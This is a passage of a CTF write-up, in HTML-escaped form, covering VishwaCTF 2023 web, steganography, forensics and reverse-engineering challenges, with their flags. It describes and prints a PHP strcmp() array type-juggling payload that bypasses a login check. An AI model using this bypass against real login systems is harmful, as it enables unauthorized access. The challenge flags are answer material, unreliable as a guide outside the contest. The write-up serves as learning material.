&lt;&#x2F;span&gt;&lt;span&gt;                $_SESSION[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;status&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt;$flag&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;else
&lt;&#x2F;span&gt;&lt;span&gt;                $_SESSION[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;status&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Invalid username or password&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;    } &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;catch&lt;&#x2F;span&gt;&lt;span&gt; (&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;Throwable &lt;&#x2F;span&gt;&lt;span&gt;$th) {
&lt;&#x2F;span&gt;&lt;span&gt;        $_SESSION[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;status&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt;$flag&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;?&amp;gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;This php code is checking for the username and password parameters which are entered in the login page. The username and flag are compared using &lt;code&gt;strcmp()&lt;&#x2F;code&gt; and similarly password and flag. If the condition satisfied we can get the flag.&lt;&#x2F;p&gt;
&lt;p&gt;Exploiting strcmp() vulnerabilities.&lt;&#x2F;p&gt;
&lt;p&gt;If I set &lt;code&gt;$_GET[&#x27;password&#x27;]&lt;&#x2F;code&gt; equal to an empty array, then strcmp would return a NULL. Due to some inherent weaknesses in PHP&#x27;s comparisons, NULL == 0 will return true.&lt;&#x2F;p&gt;
&lt;p&gt;Tried by inputing some default credentials in the login page. It says incorrect details, then i captured the request headers. I found that this &lt;code&gt;https:&#x2F;&#x2F;ch41272110703.ch.eng.run&#x2F;view.php?username=admin&amp;amp;password=1234&amp;amp;submit=Login&lt;&#x2F;code&gt; has been sent to the server for the authentication.&lt;&#x2F;p&gt;
&lt;p&gt;The payload would be : &lt;code&gt;?username=admin&amp;amp;password[]=34&amp;amp;submit=Login&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;https:&#x2F;&#x2F;ch41272110703.ch.eng.run&#x2F;view.php??username=admin&amp;amp;password[]=34&amp;amp;submit=Login&lt;&#x2F;strong&gt; returns an error in the login page with the flag.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;vishwa23&#x2F;vishwa_eezzy3.png&quot; alt=&quot;Eeezzy flag&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Flag : VishwaCTF{5t0p_c0mp4r1ng}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;hr &#x2F;&gt;
&lt;h1 id=&quot;steganography-guatemala&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#steganography-guatemala&quot; aria-label=&quot;Anchor link for: steganography-guatemala&quot;&gt;Steganography-Guatemala&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;vishwa23&#x2F;vishwa_guate1.png&quot; alt=&quot;Eeezzy flag&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Attached files : a gif file named &lt;a href = &quot;&#x2F;assets&#x2F;files&#x2F;ctf_files&#x2F;vishwactf23&#x2F;AV&quot; &gt;AV&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;I tried exiftool to view metadata of the gif.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;sh&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-sh &quot;&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;‚îå‚îÄ[intruder@parrot]‚îÄ[&#x2F;Guatemala]
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;‚îî‚îÄ‚îÄ‚ïº &lt;&#x2F;span&gt;&lt;span&gt;$exiftool AV
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;ExifTool&lt;&#x2F;span&gt;&lt;span&gt; Version Number         : 12.16
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;File&lt;&#x2F;span&gt;&lt;span&gt; Name                       : AV
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Directory&lt;&#x2F;span&gt;&lt;span&gt;                       : .
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;File&lt;&#x2F;span&gt;&lt;span&gt; Size                       : 1086 KiB
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;File&lt;&#x2F;span&gt;&lt;span&gt; Modification Date&#x2F;Time     : 2023:03:31 17:17:04+05:30
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;File&lt;&#x2F;span&gt;&lt;span&gt; Access Date&#x2F;Time           : 2023:04:04 10:58:55+05:30
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;File&lt;&#x2F;span&gt;&lt;span&gt; Inode Change Date&#x2F;Time     : 2023:04:04 10:58:51+05:30
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;File&lt;&#x2F;span&gt;&lt;span&gt; Permissions                : rwxrwx---
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;File&lt;&#x2F;span&gt;&lt;span&gt; Type                       : GIF
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;File&lt;&#x2F;span&gt;&lt;span&gt; Type Extension             : gif
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;MIME&lt;&#x2F;span&gt;&lt;span&gt; Type                       : image&#x2F;gif
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;GIF&lt;&#x2F;span&gt;&lt;span&gt; Version                     : 89a
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Image&lt;&#x2F;span&gt;&lt;span&gt; Width                     : 498
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Image&lt;&#x2F;span&gt;&lt;span&gt; Height                    : 498
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Has&lt;&#x2F;span&gt;&lt;span&gt; Color Map                   : Yes
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Color&lt;&#x2F;span&gt;&lt;span&gt; Resolution Depth          : 8
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Bits&lt;&#x2F;span&gt;&lt;span&gt; Per Pixel                  : 8
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Background&lt;&#x2F;span&gt;&lt;span&gt; Color                : 0
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Animation&lt;&#x2F;span&gt;&lt;span&gt; Iterations            : Infinite
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Comment&lt;&#x2F;span&gt;&lt;span&gt;                         : dmlzaHdhQ1RGe3ByMDczYzdfdXJfM1gxRn0=
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Frame&lt;&#x2F;span&gt;&lt;span&gt; Count                     : 17
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Duration&lt;&#x2F;span&gt;&lt;span&gt;                        : 2.04 s
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Image&lt;&#x2F;span&gt;&lt;span&gt; Size                      : 498x498
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Megapixels&lt;&#x2F;span&gt;&lt;span&gt;                      : 0.248
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;It looks there is a base64 encoded text in the comments. By decoding it we can get the flag.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;sh&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-sh &quot;&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;‚îå‚îÄ[intruder@parrot]‚îÄ[&#x2F;Guatemala]
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;‚îî‚îÄ‚îÄ‚ïº &lt;&#x2F;span&gt;&lt;span&gt;$echo &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;dmlzaHdhQ1RGe3ByMDczYzdfdXJfM1gxRn0=&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;base64&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; -d
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;vishwaCTF{pr073c7_ur_3X1F&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Flag : vishwaCTF{pr073c7_ur_3X1F}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;hr &#x2F;&gt;
&lt;h1 id=&quot;steganography-can-you-see-me&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#steganography-can-you-see-me&quot; aria-label=&quot;Anchor link for: steganography-can-you-see-me&quot;&gt;Steganography-Can you see me?&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;vishwa23&#x2F;vishwa_canyousee1.png&quot; alt=&quot;can you see me&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Attached files : &lt;a href=&quot;&#x2F;assets&#x2F;files&#x2F;ctf_files&#x2F;vishwactf23&#x2F;havealook.jpg&quot;&gt;havealook.jpg&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;First of all, lets try to extract if any data is present in the image using steghide.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;sh&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-sh &quot;&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;‚îå‚îÄ[‚úó]‚îÄ[intruder@parrot]‚îÄ[&#x2F;canyouseeme]
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;‚îî‚îÄ‚îÄ‚ïº &lt;&#x2F;span&gt;&lt;span&gt;$steghide extract&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; -sf&lt;&#x2F;span&gt;&lt;span&gt; havealook.jpg 
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Enter&lt;&#x2F;span&gt;&lt;span&gt; passphrase: 
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;steghide:&lt;&#x2F;span&gt;&lt;span&gt; could not extract any data with that passphrase!
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Okay, we dont have password. Lets use unzip if we can extract data out of it without password.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;sh&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-sh &quot;&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;‚îå‚îÄ[intruder@parrot]‚îÄ[&#x2F;canyouseeme]
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;‚îî‚îÄ‚îÄ‚ïº &lt;&#x2F;span&gt;&lt;span&gt;$unzip havealook.jpg
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Archive:&lt;&#x2F;span&gt;&lt;span&gt;  havealook.jpg
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;warning &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;[&lt;&#x2F;span&gt;&lt;span&gt;havealook.jpg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;]&lt;&#x2F;span&gt;&lt;span&gt;:  134855 extra bytes at beginning or within zipfile
&lt;&#x2F;span&gt;&lt;span&gt;  (&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;attempting&lt;&#x2F;span&gt;&lt;span&gt; to process anyway)
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;inflating:&lt;&#x2F;span&gt;&lt;span&gt; hereissomething.wav     
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Yes, we got an audio file &lt;a href=&quot;&#x2F;assets&#x2F;files&#x2F;ctf_files&#x2F;vishwactf23&#x2F;hereissomething.wav&quot;&gt;hereissomething.wav&lt;&#x2F;a&gt;. The audio is not understandable by the humans. It seems to be a morsecode. Then i used &lt;a href=&quot;https:&#x2F;&#x2F;morsecode.world&#x2F;&quot; target=_blank&gt;this site &lt;&#x2F;a&gt; to decode the morse code. In the sonic visualizer i found the flag.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;vishwa23&#x2F;vishwa_canyousee2.png&quot; alt=&quot;Flag&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Flag : vishwaCTF{n0w_y0u_533_m3}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;hr &#x2F;&gt;
&lt;h1 id=&quot;forensics-the-sender-conundrum&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#forensics-the-sender-conundrum&quot; aria-label=&quot;Anchor link for: forensics-the-sender-conundrum&quot;&gt;Forensics - The Sender Conundrum&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;vishwa23&#x2F;vishwa_conundrum1.png&quot; alt=&quot;The Sender Conundrum&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Attached files : &lt;a href=&quot;&#x2F;assets&#x2F;files&#x2F;ctf_files&#x2F;vishwactf23&#x2F;TheEmail.eml&quot;&gt;TheEmail.eml&lt;&#x2F;a&gt; and &lt;a href=&quot;&#x2F;assets&#x2F;files&#x2F;ctf_files&#x2F;vishwactf23&#x2F;unzipme.zip&quot;&gt; unzipme.zip&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;The zip file is password protected. So, lets analyze email raw data for the password.&lt;&#x2F;p&gt;
&lt;p&gt;There is a riddle sent by the sender.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;html&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-html &quot;&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;p&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;gt;&amp;lt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;p&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt;Hello Marcus Cooper,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;br&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt; You are one step behind from finding your flag. &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;br&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt; Here is a Riddle: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;br&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt; I am a noun and not a verb or an adverb.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;br&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt; I am given to you at birth and never taken away,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;br&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt; You keep me until you die, come what may.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;br&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt; What am I?&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;br&lt;&#x2F;span&gt;&lt;span style=&quot;color:#55b4d490;&quot;&gt;&amp;gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;I am too bad to solve riddles, so I found a solution on google as &lt;code&gt;Name&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Tried &lt;strong&gt;Name&lt;&#x2F;strong&gt; as the password to extract zip file. Its the wrong password. Then i tried few names present in the eml file. I found the correct name on this line &lt;strong&gt;Return-Path: BrandonLee@anonymousemail.me&lt;&#x2F;strong&gt;. I extracted the flag file from the zip with the password &lt;strong&gt;BrandonLee&lt;&#x2F;strong&gt;.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;‚îå‚îÄ[intruder@parrot]‚îÄ[thesenderconundrum]
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;‚îî‚îÄ‚îÄ‚ïº &lt;&#x2F;span&gt;&lt;span&gt;$unzip unzipme.zip 
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Archive:&lt;&#x2F;span&gt;&lt;span&gt;  unzipme.zip
&lt;&#x2F;span&gt;&lt;span&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;creating:&lt;&#x2F;span&gt;&lt;span&gt; unzipme&#x2F;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;[unzipme.zip]&lt;&#x2F;span&gt;&lt;span&gt; unzipme&#x2F;flag.txt password: 
&lt;&#x2F;span&gt;&lt;span&gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;extracting:&lt;&#x2F;span&gt;&lt;span&gt; unzipme&#x2F;flag.txt        
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;‚îå‚îÄ[intruder@parrot]‚îÄ[&#x2F;thesenderconundrum]
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;‚îî‚îÄ‚îÄ‚ïº &lt;&#x2F;span&gt;&lt;span&gt;$cat unzipme&#x2F;flag.txt
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;vishwaCTF{1d3n7i7y_7h3f7_is_n0t_4_j0k3&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Flag : vishwaCTF{1d3n7i7y_7h3f7_is_n0t_4_j0k3}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;hr &#x2F;&gt;
&lt;h1 id=&quot;rev-phi-calculator&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#rev-phi-calculator&quot; aria-label=&quot;Anchor link for: rev-phi-calculator&quot;&gt;REV-Phi-Calculator&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;vishwa23&#x2F;vishwa_phi1.png&quot; alt=&quot;Phi - calc&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Attached files : &lt;a href=&quot;&#x2F;assets&#x2F;files&#x2F;ctf_files&#x2F;vishwactf23&#x2F;Phi_Calculator.py&quot;&gt; Phi_Calculator.py&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;#============================================================================#
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;#============================Phi CALCULATOR===============================#
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;#============================================================================#
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;hashlib
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;cryptography&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;fernet &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;Fernet
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;base64
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;# GLOBALS --v
&lt;&#x2F;span&gt;&lt;span&gt;arcane_loop_trial &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;True
&lt;&#x2F;span&gt;&lt;span&gt;jump_into_full &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;False
&lt;&#x2F;span&gt;&lt;span&gt;full_version_code &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;username_trial &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;vishwaCTF&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;bUsername_trial &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;vishwaCTF&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;key_part_static1_trial &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;VishwaCTF{m4k3_it_possibl3_&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;key_part_dynamic1_trial &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;xxxxxxxx&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;key_part_static2_trial &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;}&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;key_full_template_trial &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;key_part_static1_trial &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span&gt;key_part_dynamic1_trial &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span&gt;key_part_static2_trial
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;len&lt;&#x2F;span&gt;&lt;span&gt;(key_full_template_trial))
&lt;&#x2F;span&gt;&lt;span&gt;star_db_trial &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Sharuk Khan&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;4&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;38&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Bollywood Star&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;5&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;95&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
